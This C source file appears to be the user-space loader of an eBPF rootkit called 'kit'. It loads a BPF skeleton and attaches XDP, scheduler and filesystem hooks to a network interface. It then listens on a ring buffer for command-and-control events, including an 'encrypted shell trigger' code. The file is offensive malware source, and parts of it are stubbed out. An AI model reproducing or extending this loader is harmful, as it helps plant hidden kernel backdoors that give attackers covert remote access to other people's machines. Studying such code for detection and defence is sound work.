#include <argp.h>
#include <stdio.h>
#include <time.h>
#include <signal.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <linux/if_link.h>
#include <net/if.h>
#include <unistd.h>

#include <bpf/bpf.h>

#include "kit.skel.h"

#include "../common/constants.h"
#include "../common/map_common.h"
#include "../common/c&c.h"
#include "include/utils/files/path.h"
#include "include/utils/strings/regex.h"
#include "include/utils/structures/fdlist.h"
#include "include/modules/module_manager.h"

#define ABORT_IF_ERR(err, msg)\
	if(err<0){\
		fprintf(stderr, msg);\
		goto cleanup\
	}

static struct env {
	bool verbose;
} env;

void print_help_dialog(const char* arg){
	
    printf("\nUsage: %s ./kit OPTION\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-t[NETWORK INTERFACE]";
    char* desc = "Activate XDP filter";
    printf("\t%-40s %-50s\n\n", line, desc);
	line = "-v";
    desc = "Verbose mode";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-h";
    desc = "Print this help";
    printf("\t%-40s %-50s\n\n", line, desc);

}

/*Wrapper for printing into stderr when debug active*/
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args){
	if (level == LIBBPF_DEBUG && !env.verbose)
		return 0;
	return vfprintf(stderr, format, args);
}

/**
* Increases kernel internal memory limit
* necessary to allocate resouces like BPF maps.
*/
static void bump_memlock_rlimit(void){
	struct rlimit rlim_new = {
		.rlim_cur	= RLIM_INFINITY,
		.rlim_max	= RLIM_INFINITY,
	};

	if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
		fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit!\n");
		exit(1);
	}
}

static volatile bool exiting = false;

static void sig_handler(int sig){
	exiting = true;
}

/**
 * @brief Manages an event received via the ring buffer
 * It's a message from th ebpf program
 * 
 * @param ctx 
 * @param data 
 * @param data_sz 
 * @return int 
 */
static int handle_rb_event(void *ctx, void *data, size_t data_size){
	const struct rb_event *e = data;

	//For time displaying
	struct tm *tm;
	char ts[32];
	time_t t;
	time(&t);
	tm = localtime(&t);
	strftime(ts, sizeof(ts), "%H:%M:%S", tm);


    if(e->event_type == INFO){
		printf("%s INFO  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
	}else if(e->event_type == DEBUG){

	}else if(e->event_type == ERROR){

	}else if(e->event_type == EXIT){

	}else if(e->event_type == COMMAND){
		printf("%s COMMAND  pid:%d code:%i\n", ts, e->pid, e->code);
		switch(e->code){
			case CC_PROT_K3_ENCRYPTED_SHELL_TRIGGER_V1:
				printf("Starting encrypted connection\n");
				
            	break;
			default:
				printf("Command received unknown: %d\n", e->code);
		}
	}else{
		printf("%s COMMAND  pid:%d code:%i, msg:%s\n", ts, e->pid, e->code, e->message);
		return -1;
	}

	return 0;
}


int main(int argc, char**argv){
    struct ring_buffer *rb = NULL;
    struct kit_bpf *skel;
    __u32 err;

	//Ready to be used
	/*for (int arg = 1; arg < argc; arg++) {
		if (load_fd_kmsg(argv[arg])) {
			fprintf(stderr, "%s.\n", strerror(errno));
			return EXIT_FAILURE;
		}
	}*/
	
	__u32 ifindex; 

	/* Parse command line arguments */
	int opt;
	while ((opt = getopt(argc, argv, ":t:vh")) != -1) {
        switch (opt) {
        case 't':
            ifindex = if_nametoindex(optarg);
            printf("Activating filter on network interface: %s\n", optarg);
            if(ifindex == 0){
				perror("Error on input interface");
				exit(EXIT_FAILURE);
			}
			break;
		case 'v':
			//Verbose output
			env.verbose = true;
			break;

        case 'h':
            print_help_dialog(argv[0]);
            exit(0);
            break;
        case '?':
            printf("Unknown option: %c\n", optopt);
			exit(EXIT_FAILURE);
            break;
        case ':':
            printf("Missing arguments for %c\n", optopt);
            exit(EXIT_FAILURE);
            break;
        
        default:
            print_help_dialog(argv[0]);
            exit(EXIT_FAILURE);
        }
    }
	
	//Set up libbpf errors and debug info callback
	libbpf_set_print(libbpf_print_fn);

	// Bump RLIMIT_MEMLOCK to be able to create BPF maps
	bump_memlock_rlimit();

	//Cleaner handling of Ctrl-C
	signal(SIGINT, sig_handler);
	signal(SIGTERM, sig_handler);

    //Open and create BPF application in the kernel
	skel = kit_bpf__open();
	if (!skel) {
		fprintf(stderr, "Failed to open and load BPF skeleton\n");
		return 1;
	}

	//Load & verify BPF program
	err = kit_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

	//Attach XDP and sched modules using module manager
	//and setup the parameters for the installation
	//XDP
	module_config.xdp_module.all = ON;
	module_config_attr.xdp_module.flags = XDP_FLAGS_REPLACE;
	module_config_attr.xdp_module.ifindex = ifindex;
	//SCHED
	module_config.sched_module.all = ON;
	//FS
	module_config.fs_module.all = ON;
	
	module_config_attr.skel = skel;
	err = setup_all_modules();

	// Set up ring buffer polling --> Main communication buffer kernel->user
	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
	if (rb==NULL) {
		err = -1;
		fprintf(stderr, "Failed to create ring buffer\n");
		goto cleanup;
	}

	//Now wait for messages from ebpf program
	printf("Filter set and ready\n");
	while (!exiting) {
		err = ring_buffer__poll(rb, 100 /* timeout, ms */);
		
		//Checking if a signal occured
		if (err == -EINTR) {
			err = 0;
			break;
		}
		if (err < 0) {
			printf("Error polling ring buffer: %d\n", err);
			break;
		}
	}

	//Received signal to stop, detach program from network interface
	/*err = detach_sched_all(skel);
	if(err<0){
		perror("ERR");
		goto cleanup;
	}
	detach_xdp_all(skel);
	if(err<0){
		perror("ERR");
		goto cleanup;
	}*/

cleanup:
	ring_buffer__free(rb);
	//kit_bpf__destroy(skel);
	if(err!=0) return -1;

    return 0;
}
